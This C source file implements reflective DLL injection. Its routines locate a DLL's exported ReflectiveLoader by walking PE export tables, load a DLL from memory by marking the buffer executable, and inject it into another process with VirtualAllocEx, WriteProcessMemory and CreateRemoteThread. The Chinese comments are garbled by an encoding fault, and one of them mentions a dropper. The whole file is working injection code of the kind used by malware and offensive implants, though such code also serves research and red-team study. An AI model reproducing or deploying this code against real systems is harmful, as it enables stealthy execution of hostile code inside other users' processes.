
#include "LoadLibraryR.h"
#include <stdio.h>

// ��RVA��ַת��Ϊ�ļ�ƫ��
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress) {
	// �õ�ntͷ���ڴ��е�ʵ�ʵ�ַ
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	// ��ýڱ�
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

	// �����������
	if (dwRva < pSectionHeader[0].PointerToRawData)
		return dwRva;

	// ͨ�������飬���ҵ����ƫ�Ƶ�ַ��Ӧ���ļ�ƫ�Ƶ�ַ
	for (WORD wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
	}

	return 0;
}

// ��ȡDLL�з�����غ����ĵ�ַ
DWORD GetReflectiveLoaderOffset(void* lpReflectiveDllBuffer) {
	// �ж�λ��
#ifdef WIN_X64
	DWORD dwCompiledArch = 2;
#else
	// �⽫���� Win32 �� WinRT��
	DWORD dwCompiledArch = 1;
#endif

	//��ַ->��Dropper�����п��ٵĶѿռ����ʼ��ַ
	UINT_PTR uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// ��ȡģ�� NT Header ���ļ�ƫ����
	UINT_PTR uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// �����dwCompiledArchλ���Ƿ���ͬ
	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) { // PE32
		if (dwCompiledArch != 1)
			return 0;
	} else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) { // PE64
		if (dwCompiledArch != 2)
			return 0;
	} else {
		return 0;
	}

	// ��õ�����ṹ��ָ��ĵ�ַ
	UINT_PTR uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// ��ȡ������ṹ����ļ�ƫ����
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// ��ȡ����������������ļ�ƫ����
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// ��ȡ����������ַ����ļ�ƫ����
	UINT_PTR uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// ��ȡ������ŵ�ַ����ļ�ƫ����
	UINT_PTR uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// ��ȡ��������������
	DWORD dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// �������е����ĺ������ҵ� ReflectiveLoader
	while (dwCounter--) {
		// ������Ҫ����ȡ���ĸ����RVAת��Ϊ����ʵ�ʵ��ļ�ƫ��
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));

		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL) {
			// ��ȡ��ַ����ʼ��ַ��ʵ��λ��
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

			// ��������ҵ���Ŷ�Ӧ�ĺ�����ַ
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

			// ����ReflectiveLoader�������ļ�ƫ�ƣ����������������ʼ��ַ
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// ��ȡ��һ�������ĺ�����
		uiNameArray += sizeof(DWORD);

		// ��ȡ��һ�������ĺ���������
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

// ͨ���䵼���� ReflectiveLoader �������ڴ��м��� DLL ӳ��
HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength) {
	HMODULE hResult = NULL;

	if (lpBuffer == NULL || dwLength == 0)
		return NULL;
	try {
		// �����Ƿ��� ReflectiveLoader...
		DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (dwReflectiveLoaderOffset != 0) {
			REFLECTIVELOADER pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);

			// ���Ǳ���� RWX �Ļ��������� VirtualProtect���������ǲ���ִ�� ReflectiveLoader...
			// ������� lpBuffer ��ҳ������Ļ���ַ��dwLength ������Ĵ�С
			DWORD dwOldProtect = 0;
			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
				// ���ÿ� ReflectiveLoader...
				DLLMAIN pDllMain = (DLLMAIN)pReflectiveLoader();
				if (pDllMain != NULL) {
					// ���ü��صĿ� DllMain �Ի�ȡ�� HMODULE
					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
						hResult = NULL;
				}
				// �ָ�����ǰ�ı�����־...
				VirtualProtect(lpBuffer, dwLength, dwOldProtect, &dwOldProtect);
			}
		}
	} catch (...) {
		hResult = NULL;
	}

	return hResult;
}
//================================================= ================================================//
// ͨ��dll������ ReflectiveLoader ������DLL���ڴ���ص�Ŀ����̵ĵ�ַ�ռ�
// ע�⣺������������ REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR ע����κζ���Ϊ��ʹ����ȷ�� RDI ԭ�Ͷ����塣
// ע�⣺hProcess �������������·���Ȩ�ޣ� PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
// ע�⣺����㴫��һ�� lpParameter ֵ���������һ��ָ�룬���ס������Բ�ͬ�ĵ�ַ�ռ�ġ�
HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter) {
	HANDLE hThread = NULL;

	try {

		do {
			if (!hProcess || !lpBuffer || !dwLength)
				break;

			// ��ȡ�������ĵ�ַ���ļ�ƫ�ƣ�
			DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
			if (!dwReflectiveLoaderOffset)
				break;

			// ��Ŀ����̷����ڴ棨RWX��
			LPVOID lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (!lpRemoteLibraryBuffer)
				break;

			// д����
			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
				break;

			// �̺߳����ĵ�ַ = ����ַ + �ļ�ƫ��
			LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

			// ����Զ���߳�ִ�к���
			DWORD dwThreadId = NULL;
			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);

		} while (FALSE);

	} catch (...) {
		hThread = NULL;
	}

	return hThread;
}
